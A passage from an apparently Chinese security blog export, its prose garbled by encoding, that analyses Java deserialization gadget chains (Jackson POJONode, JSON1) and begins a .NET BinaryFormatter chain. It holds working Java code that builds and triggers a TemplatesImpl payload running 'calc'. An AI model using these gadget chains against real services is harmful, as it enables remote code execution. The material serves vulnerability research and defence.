<p>åœ¨æ ‡è®°ä»£ç å—[3]ä¸­ä½¿ç”¨äº†<code>BadAttributeValueExpException</code> ä½œä¸ºååºåˆ—åŒ–çš„èµ·å§‹ç‚¹ï¼Œ<code>BadAttributeValueExpException</code>æ˜¯ä¸€ä¸ªæ¯”è¾ƒå¸¸ç”¨çš„ç±»ï¼Œå…¶<code>readObject</code>æ–¹æ³•è°ƒç”¨ä¼šè§¦å‘<code>val</code>å±æ€§å€¼çš„<code>toString</code>æ–¹æ³•ã€‚<br>å°†<code>val</code>è®¾ç½®ä¸ºä¸€ä¸ª<code>POJONode</code>å¯¹è±¡ï¼Œå…¶<code>toString</code>æ–¹æ³•å®šä¹‰åœ¨çˆ¶ç±»<code>BaseJsonNode</code>æ–¹æ³•ä¸­ã€‚  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> InternalNodeMapper.nodeToString(<span class="built_in">this</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><code>nodeToString</code>æ–¹æ³•å°†è°ƒç”¨<code>STD_WRITTER</code>çš„<code>writeValueAsString</code>æ–¹æ³•ï¼Œè¯¥æ–¹æ³•åœ¨è°ƒç”¨è¿‡ç¨‹ä¸­ä¼šé€šè¿‡åå°„çš„æ–¹å¼å°è¯•è·å–<code>POJONode</code>æ–¹æ³•å®ä¾‹åŒ–æ—¶ä¼ å…¥å‚æ•°å¯¹è±¡çš„æ‰€æœ‰<code>getter</code>æ–¹æ³•ï¼Œç„¶åæŒ‰ç…§è·å–é¡ºåºä¾æ¬¡è°ƒç”¨ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">nodeToString</span><span class="params">(BaseJsonNode n)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> STD_WRITER.writeValueAsString(_wrapper(n));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var2) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(var2);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><code>getter</code>æ–¹æ³•çš„è·å–é¡ºåºæ˜¯éšæœºçš„å¹¶ä¸”ä¼šè¢«ç¼“å­˜æœºåˆ¶ç¼“å­˜ï¼Œå½“<code>StylesheetDOM</code>çš„è·å–åœ¨<code>OutputProperties</code>ä¹‹å‰æ—¶ä¾¿ä¼šå› ä¸º<code>_sdom</code>ä¸ºç©ºå¯¼è‡´ç¨‹åºå¼‚å¸¸é€€å‡ºã€‚<br><img src="/archives/42eb2c82/001.png"><br>ä¸ºäº†å¤„ç†è¿™ä¸ªé—®é¢˜ä½¿ç”¨äº†<code>JdkDynamicAopProxy</code>ä»£ç†<code>Templates</code>æ¥å£åˆ›å»ºä»£ç†ç±»ï¼Œä»£ç†ç±»åœ¨é€šè¿‡åå°„è·å–æ–¹æ³•æ—¶åªèƒ½è·å–åˆ°è¢«ä»£ç†æ¥å£ä¸­å®šä¹‰çš„æ–¹æ³•ï¼Œå¦‚æ­¤ä¾¿å¯ä»¥å±è”½æ‰<code>getStylesheetDOM</code>æ–¹æ³•ï¼Œè¿™ä¾¿æ˜¯æ ‡è®°ä»£ç å—[2]å¤„ä»£ç çš„æ„ä¹‰ã€‚  </p>
<h3 id="æ–¹æ³•è°ƒç”¨åˆ†æµ"><a href="#æ–¹æ³•è°ƒç”¨åˆ†æµ" class="headerlink" title="æ–¹æ³•è°ƒç”¨åˆ†æµ"></a>æ–¹æ³•è°ƒç”¨åˆ†æµ</h3><p>å¦‚ä¸Šä¸€èŠ‚é€šè¿‡ä»£ç†æ¥å£å±è”½æ— å…³æ–¹æ³•è°ƒç”¨ä»è€Œå±è”½å¼‚å¸¸çš„æ–¹å¼æœ‰ä¸¥æ ¼çš„é™åˆ¶ï¼Œéœ€è¦æ»¡è¶³æ°å¥½è¢«ä»£ç†æ¥å£å®šä¹‰äº†æˆ‘ä»¬éœ€è¦çš„ç›®æ ‡æ–¹æ³•ä¸”æ²¡æœ‰å®šä¹‰ä¸€äº›å…¶ä»–çš„å¯èƒ½å¯¹ç»“æœäº§ç”Ÿå¹²æ‰°çš„æ–¹æ³•ï¼Œè¿™ç§æƒ…å†µå¾€å¾€å¯é‡ä¸å¯æ±‚ã€‚æœ¬èŠ‚å°†æä¾›å¦å¤–ä¸€ç§å¯¹æ–¹æ³•è°ƒç”¨å¼‚å¸¸è¿›è¡Œå±è”½çš„æ–¹æ³•ã€‚<br><code>CompositeInvocationHandlerImpl</code>èƒ½å¤Ÿå¯¹æ–¹æ³•è°ƒç”¨å¼‚å¸¸è¿›è¡Œå±è”½çš„æ ¸å¿ƒåœ¨äºå…¶èƒ½æ ¹æ®æ–¹æ³•åå¯¹æ–¹æ³•çš„è°ƒç”¨è¿›è¡Œåˆ†æµï¼Œå¯¹äºåœ¨è°ƒç”¨è¿‡ç¨‹ä¸­ä¼šå¯¼è‡´å¼‚å¸¸çš„æ–¹æ³•é€šè¿‡<code>AnnotationInvocationHandler</code>ç›´æ¥æ›¿æ¢æ‰å“åº”ç»“æœå³å¯å±è”½å¯èƒ½å¯¼è‡´å¼‚å¸¸çš„è¿‡ç¨‹è°ƒç”¨ã€‚<br>å…·ä½“çš„å®ç°æ–¹æ³•æ˜¯é€šè¿‡å°†å¯èƒ½å¯¼è‡´å¼‚å¸¸çš„æ–¹æ³•æ‰€å±ç±»ä½œä¸º<code>key</code>ï¼Œå°†<code>AnnotationInvocationHandler</code>ä½œä¸º<code>value</code>æ”¾åˆ°ä¸€ä¸ª<code>Map</code>ä¸­ï¼Œå½“æ–¹æ³•è°ƒç”¨æ—¶é¦–å…ˆå°è¯•ä»è¿™ä¸ª<code>Map</code>ä¸­è·å–å¯¹åº”çš„<code>handler</code>å†ä½¿ç”¨è¯¥<code>handler</code>è¿›è¡Œå®é™…çš„æ–¹æ³•è°ƒç”¨ã€‚  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">( Object proxy, Method method, Object[] args )</span></span><br><span class="line">        <span class="keyword">throws</span> Throwable</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> method.getDeclaringClass() ;</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span></span><br><span class="line">            (InvocationHandler)classToInvocationHandler.get( cls ) ;</span><br><span class="line">        <span class="keyword">if</span> (handler == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (defaultHandler != <span class="literal">null</span>)</span><br><span class="line">                handler = defaultHandler ;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">ORBUtilSystemException</span> <span class="variable">wrapper</span> <span class="operator">=</span> ORBUtilSystemException.get(</span><br><span class="line">                    CORBALogDomains.UTIL ) ;</span><br><span class="line">                <span class="keyword">throw</span> wrapper.noInvocationHandler( <span class="string">&quot;\&quot;&quot;</span> + method.toString() +</span><br><span class="line">                    <span class="string">&quot;\&quot;&quot;</span> ) ;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> handler.invoke( proxy, method, args ) ;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><code>json-lib</code>åŒæ ·æ˜¯ç”¨æ¥å¤„ç†<code>JSON</code>å­—ç¬¦ä¸²çš„<code>Java</code>å·¥å…·åŒ…ï¼Œå…¶ä¸­ä¹Ÿå­˜åœ¨ä¸€æ¡ååºåˆ—åŒ–åˆ©ç”¨é“¾ï¼Œè¿™æ¡é“¾è¢«æˆä¸º<code>JSON1</code>ã€‚<br>åœ¨<code>JSON1</code>é“¾ä¸­ä¾¿ä½¿ç”¨äº†æ–¹æ³•è°ƒç”¨åˆ†æµæ–¹å¼æ¥å±è”½<code>getCompositeType</code>æ–¹æ³•è°ƒç”¨å¯¼è‡´çš„å¼‚å¸¸ã€‚  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">makeCallerChain</span><span class="params">(Object payload, Class... ifaces)</span> <span class="keyword">throws</span> OpenDataException, NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, Exception, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">CompositeType</span> <span class="variable">rt</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CompositeType</span>(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;a&quot;</span>&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;a&quot;</span>&#125;, <span class="keyword">new</span> <span class="title class_">OpenType</span>[]&#123;SimpleType.INTEGER&#125;);</span><br><span class="line">        <span class="type">TabularType</span> <span class="variable">tt</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TabularType</span>(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, rt, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;a&quot;</span>&#125;);</span><br><span class="line">        <span class="type">TabularDataSupport</span> <span class="variable">t1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TabularDataSupport</span>(tt);</span><br><span class="line">        <span class="type">TabularDataSupport</span> <span class="variable">t2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TabularDataSupport</span>(tt);</span><br><span class="line">        <span class="type">AdvisedSupport</span> <span class="variable">as</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AdvisedSupport</span>();</span><br><span class="line">        as.setTarget(payload);</span><br><span class="line">		<span class="comment">// [1]</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">delegateInvocationHandler</span> <span class="operator">=</span> (InvocationHandler)Reflections.newInstance(<span class="string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;as&#125;);</span><br><span class="line">		<span class="comment">// [2]</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">cdsInvocationHandler</span> <span class="operator">=</span> Gadgets.createMemoizedInvocationHandler(Gadgets.createMap(<span class="string">&quot;getCompositeType&quot;</span>, rt));</span><br><span class="line">		<span class="comment">// [3]</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler)Reflections.newInstance(<span class="string">&quot;com.sun.corba.se.spi.orbutil.proxy.CompositeInvocationHandlerImpl&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">        ((Map)Reflections.getFieldValue(invocationHandler, <span class="string">&quot;classToInvocationHandler&quot;</span>)).put(CompositeData.class, cdsInvocationHandler);</span><br><span class="line">        Reflections.setFieldValue(invocationHandler, <span class="string">&quot;defaultHandler&quot;</span>, delegateInvocationHandler);</span><br><span class="line">		<span class="comment">// [4]</span></span><br><span class="line">        <span class="type">CompositeData</span> <span class="variable">cdsProxy</span> <span class="operator">=</span> (CompositeData)Gadgets.createProxy(invocationHandler, CompositeData.class, ifaces);</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">m</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        m.put(<span class="string">&quot;t&quot;</span>, cdsProxy);</span><br><span class="line">		<span class="comment">// [5]</span></span><br><span class="line">        Reflections.setFieldValue(jo, <span class="string">&quot;properties&quot;</span>, m);</span><br><span class="line">        Reflections.setFieldValue(jo, <span class="string">&quot;properties&quot;</span>, m);</span><br><span class="line">        Reflections.setFieldValue(t1, <span class="string">&quot;dataMap&quot;</span>, jo);</span><br><span class="line">        Reflections.setFieldValue(t2, <span class="string">&quot;dataMap&quot;</span>, jo);</span><br><span class="line">		<span class="comment">// [6]</span></span><br><span class="line">        <span class="keyword">return</span> Gadgets.makeMap(t1, t2);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><code>JSON1</code>åœ¨ååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­ä¼šè§¦å‘<code>getCompositeType</code>æ–¹æ³•å¹¶äº§ç”Ÿå¼‚å¸¸ï¼Œæ•…ä½¿ç”¨<code>CompositeInvocationHandlerImpl</code>å¯¹<code>CompositeData</code>ç±»ä¸­çš„<code>getter</code>è¿›è¡Œåˆ†æµå¤„ç†ï¼Œä½¿ç”¨<code>AnnotationInvocationHandler</code>ç›´æ¥å“åº”æœ‰æ•ˆå¯¹è±¡é¿å…è°ƒç”¨è¿‡ç¨‹ä¸­çš„å¼‚å¸¸ã€‚<br>è€Œå¯¹äºéœ€è¦è°ƒç”¨çš„ç›®æ ‡æ–¹æ³•ï¼ˆTemplatesImplçš„getOutputPropertiesæ–¹æ³•ï¼‰åˆ™ä½¿ç”¨<code>JdkDynamicAopProxy</code>ä»£ç†è¿›è¡Œç®€å•çš„åå°„æ–¹æ³•è°ƒç”¨å³å¯ã€‚<br><code>JSON1</code>é“¾çš„ç®€è¦è°ƒç”¨æµç¨‹å›¾ä¸‹ã€‚<br><img src="/archives/42eb2c82/009.png">  </p>
<h2 id="æ‹“å±•"><a href="#æ‹“å±•" class="headerlink" title="æ‹“å±•"></a>æ‹“å±•</h2><p>åœ¨<code>JSON1</code>çš„ä¾‹å­ä¸­æˆ‘ä»¬ä½¿ç”¨äº†<code>CompositeInvocationHandlerImpl</code>æ ¹æ®æ–¹æ³•å£°æ˜ç±»é€‰æ‹©ä¸åŒçš„<code>invocationHandler</code>å¯¹æ–¹æ³•è¿›è¡Œå¤„ç†ï¼Œå…¶ç›®çš„æ˜¯ä¸ºäº†å±è”½<code>getCompositeType</code>è°ƒç”¨å¼‚å¸¸ï¼Œ<br>åŒæ ·çš„åœ¨<code>Jackson</code>ä¸­ä¹Ÿå­˜åœ¨æ–¹æ³•è°ƒç”¨å¼‚å¸¸ï¼Œä¸è¿‡åœ¨è¿™é‡Œåˆ©ç”¨çš„å´æ˜¯åå°„è·å–ä»£ç†ç±»çš„ç‰¹æ€§ã€‚é‚£ä¹ˆæ˜¯å¦å¯ä»¥å°†<code>CompositeInvocationHandlerImpl</code>ç”¨äº<code>Jackson</code>ä¸­å‘¢ï¼Ÿ<br>ä»¥ä¸‹æ˜¯å¯¹åŸå§‹çš„<code>Jackson</code>é“¾è¿›è¡Œæ”¹é€ åçš„ä»£ç ã€‚  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> ClassPool.getDefault().get(<span class="string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);</span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">writeReplace</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;writeReplace&quot;</span>);</span><br><span class="line">        ctClass.removeMethod(writeReplace);</span><br><span class="line">        ctClass.toClass();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        AdvisedSupport advisedSupport = new AdvisedSupport();</span></span><br><span class="line"><span class="comment">//        advisedSupport.setTarget(templates);</span></span><br><span class="line"><span class="comment">//        Constructor constructor = Class.forName(&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;).getConstructor(AdvisedSupport.class);</span></span><br><span class="line"><span class="comment">//        constructor.setAccessible(true);</span></span><br><span class="line"><span class="comment">//        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);</span></span><br><span class="line"><span class="comment">//        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]&#123;Templates.class&#125;, handler);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">AdvisedSupport</span> <span class="variable">as</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AdvisedSupport</span>();</span><br><span class="line">        as.setTarget(templates);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">delegateInvocationHandler</span> <span class="operator">=</span> (InvocationHandler) Reflections.newInstance(<span class="string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;as&#125;);</span><br><span class="line">        <span class="comment">// æ­¤å¤„ä¼ å…¥åˆ°JdkDynamicAopProxyä¸­çš„å‚æ•°ä¹Ÿä¸ºasï¼Œå› ä¸ºStylesheetDomHandleråªæ˜¯ç”¨æ¥å……æ•°çš„ï¼Œå…¶åŠŸèƒ½å¹¶ä¸é‡è¦ï¼Œé‡è¦æ˜¯æœ‰è€Œä¸æ˜¯åŠŸèƒ½ï¼Œå› ä¸ºå¹¶ä¸ä¼šæœ‰æ–¹æ³•è°ƒç”¨ä¼šè§¦å‘åˆ°è¯¥å¤„ç†å™¨çš„invokeæ–¹æ³•</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">StylesheetDomHandler</span> <span class="operator">=</span> (InvocationHandler) Reflections.newInstance(<span class="string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;as&#125;);</span><br><span class="line">        Class&lt;?&gt;[] allIfaces = (Class[])((Class[]) Array.newInstance(Class.class, <span class="number">2</span>));</span><br><span class="line">        allIfaces[<span class="number">0</span>] = Serializable.class;</span><br><span class="line">        allIfaces[<span class="number">1</span>] = DOM.class;</span><br><span class="line">        <span class="comment">// åˆ›å»ºä»£ç†ç±»åŒæ—¶ä»£ç†DOMæ¥å£ä»¥åŠSerializableæ¥å£ï¼Œå› ä¸ºgetStylesheetDOMæ–¹æ³•éœ€è¦å“åº”ä¸€ä¸ª DOM ç±»å‹å¯¹è±¡ï¼Œä½†æ˜¯DOMçš„å‡ ä¸ªå®ç°ç±»éƒ½æ²¡æœ‰å®ç°Serializableæ¥å£ä¸å¯åºåˆ—åŒ–</span></span><br><span class="line">        <span class="comment">// æ‰€ä»¥éœ€è¦åŒæ—¶ä»£ç† Serializable æ¥å£</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces, StylesheetDomHandler);</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">cdsInvocationHandler</span> <span class="operator">=</span> Gadgets.createMemoizedInvocationHandler(Gadgets.createMap(<span class="string">&quot;getStylesheetDOM&quot;</span>, o));</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler)Reflections.newInstance(<span class="string">&quot;com.sun.corba.se.spi.orbutil.proxy.CompositeInvocationHandlerImpl&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="comment">// getStylesheetDOMçš„å®šä¹‰ç±»ä¸º TemplatesImpl æ‰€ä»¥è¿™é‡Œé€šè¿‡ TemplatesImpl.class ç´¢å¼•</span></span><br><span class="line">        <span class="comment">// å½“getStylesheetDOMæ–¹æ³•è¢«è°ƒç”¨æ˜¯å°±ä¼šä½¿ç”¨ cdsInvocationHandler æ¥è¿›è¡Œå®é™…çš„æ–¹æ³•è°ƒç”¨</span></span><br><span class="line">        <span class="comment">// cdsInvocationHandler æ˜¯ä¸€ä¸ª AnnotationInvocationHandler å¯¹è±¡å¯ä»¥ç”¨æ¥æ›¿æ¢è¿”å›å¯¹è±¡ç±»å‹ã€‚</span></span><br><span class="line">        ((Map)Reflections.getFieldValue(invocationHandler, <span class="string">&quot;classToInvocationHandler&quot;</span>)).put(TemplatesImpl.class, cdsInvocationHandler);</span><br><span class="line">        Reflections.setFieldValue(invocationHandler, <span class="string">&quot;defaultHandler&quot;</span>, delegateInvocationHandler);</span><br><span class="line">        <span class="type">Templates</span> <span class="variable">cdsProxy</span> <span class="operator">=</span> Gadgets.createProxy(invocationHandler, Templates.class);</span><br><span class="line"></span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">node</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(cdsProxy);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">val</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        setFieldValue(val, <span class="string">&quot;val&quot;</span>, node);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] serialize = Serializer.serialize(val);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(serialize);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>è¿è¡Œä¿®æ”¹åçš„<code>Jackson</code>é“¾ï¼Œæ­£å¸¸å¼¹å‡ºè®¡ç®—å™¨ï¼ŒåŒæ—¶åœ¨æ—¥å¿—ä¸­åŒæ ·å¯ä»¥æŸ¥çœ‹ç›®æ ‡æ–¹æ³•è¢«æˆåŠŸè°ƒç”¨<br><img src="/archives/42eb2c82/002.png"><br>åœ¨<code>jdk8u71</code>ä»¥ä¸‹ç‰ˆæœ¬çš„è¿è¡Œç¯å¢ƒä¸­è¯¥ä¿®æ”¹å¯ä»¥æˆåŠŸè¿è¡Œï¼Œä½†åœ¨ä¹‹åçš„ç‰ˆæœ¬ä¸­è¯¥ä¿®æ”¹æ˜¯ä¸èƒ½æˆåŠŸè¿è¡Œçš„ï¼ŒåŸå› åœ¨äºä½¿ç”¨äº†<code>AnnotationInvocationHandler</code>æ¥æ›¿æ¢<code>getStylesheetDOM</code>çš„å“åº”ç»“æœï¼Œ<br><code>AnnotationInvocationHandler</code>åœ¨<code>jdk8u71</code>åè¢«å¢åŠ äº†æ–°çš„é™åˆ¶ï¼Œå…¶åªèƒ½ä»£ç†ä½¿ç”¨äº†æ³¨è§£çš„æ–¹æ³•ï¼Œå¦‚ï¼š<code>@Override</code> æ³¨è§£ç­‰ã€‚åœ¨<code>JSON1</code>é“¾ä¸­æˆ‘ä»¬ä»£ç†çš„<code>getCompositeType</code>æ–¹æ³•ä¾¿å­˜åœ¨æ³¨è§£<code>@Override</code>ï¼Œæ‰€ä»¥ä¸å—<code>jdk</code>ç‰ˆæœ¬é™åˆ¶ã€‚  </p>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>éšç€æŠ€æœ¯çš„å‘å±•ä»¥åŠJDKä¸æ–­åœ°æ›´æ–°ï¼Œ<code>AnnotationInvocationHandler</code>çš„ä½¿ç”¨è¢«åŠ ä¸Šäº†é™åˆ¶ï¼Œåœ¨jdk8u71åå·²ç»ä¸å†èƒ½å¤Ÿè¢«éšæ„ä½¿ç”¨ã€‚è™½ç„¶å¦‚æ­¤ï¼Œåˆ©ç”¨åŠ¨æ€ä»£ç†æ€æƒ³è§£å†³é—®é¢˜çš„æ€è·¯æ˜¯ä¸€ä»¥è´¯ä¹‹çš„ã€‚<br>åœ¨ä¸åŒçš„å®è·µä¸­ä¹Ÿå¯èƒ½å­˜åœ¨ç€å…¶ä»–æ›´å…·åˆ©ç”¨ä»·å€¼çš„<code>InvocationHandler</code>å€¼å¾—æˆ‘ä»¬å»å‘æ˜ã€‚æ”»é˜²å¯¹æŠ—å°±æ˜¯è¿™æ ·é­”é«˜ä¸€ä¸ˆé“é«˜ä¸€å°ºï¼Œåªæœ‰åœ¨æ”»ä¸é˜²çš„ä¸æ–­å¯¹æŠ—ä¸­ç ¥ç ºå‰è¡Œæ‰èƒ½å‘ç°æ›´å¤šæœ‰æ•ˆçš„æ€è·¯ä¸æŠ€å·§ã€‚</p>
]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
      </categories>
      <tags>
        <tag>ååºåˆ—åŒ–</tag>
        <tag>åŠ¨æ€ä»£ç†</tag>
        <tag>Jackson</tag>
        <tag>JSON1</tag>
        <tag>Spring1</tag>
      </tags>
  </entry>
  <entry>
    <title>BinaryFormatterååºåˆ—åŒ–æ¼æ´ä¹‹ActivitySurrogateSelectoråˆ©ç”¨é“¾</title>
    <url>/archives/6f1feaf8.html</url>
    <content><![CDATA[<h1 id="åˆ©ç”¨é“¾åˆ†æ"><a href="#åˆ©ç”¨é“¾åˆ†æ" class="headerlink" title="åˆ©ç”¨é“¾åˆ†æ"></a>åˆ©ç”¨é“¾åˆ†æ</h1><p>å…³äºåºåˆ—åŒ–ä¸ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ä½¿ç”¨çš„ä»£ç†é€‰æ‹©å™¨ä»¥åŠä»£ç†è¿™é‡Œå°±ä¸å†ä»‹ç»äº†ï¼Œä»£ç†ï¼ˆSurrogateï¼‰å¯ä»¥ä½¿å¾—ä¸èƒ½è¢«åºåˆ—åŒ–çš„ç±»è¢«åºåˆ—åŒ–ï¼Œå…·ä½“çš„æ“ä½œéœ€è¦ç”¨æˆ·è‡ªè¡Œå®ç°ä¸€ä¸ª<code>ISerializationSurrogate</code>æ¥å£å¹¶å®ç°å…¶<code>GetObjectData</code>ä»¥åŠ<code>SetObjectData</code>æ–¹æ³•ã€‚  </p>
<span id="more"></span>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"><span class="keyword">using</span> System.Reflection;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Formatters.Binary;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Test</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Personal</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> Name;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">int</span> Age;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> Address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">PersonalSurrogate</span> : <span class="title">ISerializationSurrogate</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetObjectData</span>(<span class="params"><span class="built_in">object</span> obj, SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Personal personal = (Personal)obj;</span><br><span class="line">            info.AddValue(<span class="string">&quot;Name&quot;</span>, personal.Name);</span><br><span class="line">            info.AddValue(<span class="string">&quot;Age&quot;</span>, personal.Age);</span><br><span class="line">            info.AddValue(<span class="string">&quot;Address&quot;</span>, personal.Address);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="built_in">object</span> <span class="title">SetObjectData</span>(<span class="params"><span class="built_in">object</span> obj, SerializationInfo info, StreamingContext context, ISurrogateSelector selector</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Personal personal = (Personal)obj;</span><br><span class="line">            personal.Name = info.GetString(<span class="string">&quot;Name&quot;</span>);</span><br><span class="line">            personal.Age = info.GetInt32(<span class="string">&quot;Age&quot;</span>);</span><br><span class="line">            personal.Address = info.GetString(<span class="string">&quot;Address&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> personal;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">SurrogateTest</span></span><br><span class="line">        &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] <span class="keyword">args</span></span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Personal personal = <span class="keyword">new</span> Personal();</span><br><span class="line">            BinaryFormatter binaryFormatter = <span class="keyword">new</span> BinaryFormatter();</span><br><span class="line">            PersonalSurrogate personalSurrogate = <span class="keyword">new</span> PersonalSurrogate();</span><br><span class="line">            SurrogateSelector surrogateSelector = <span class="keyword">new</span> SurrogateSelector();</span><br><span class="line">            surrogateSelector.AddSurrogate(<span class="keyword">typeof</span>(Personal), <span class="keyword">new</span> StreamingContext(StreamingContextStates.All), personalSurrogate);</span><br><span class="line">            binaryFormatter.SurrogateSelector = surrogateSelector;</span><br><span class="line">            MemoryStream memoryStream = <span class="keyword">new</span> 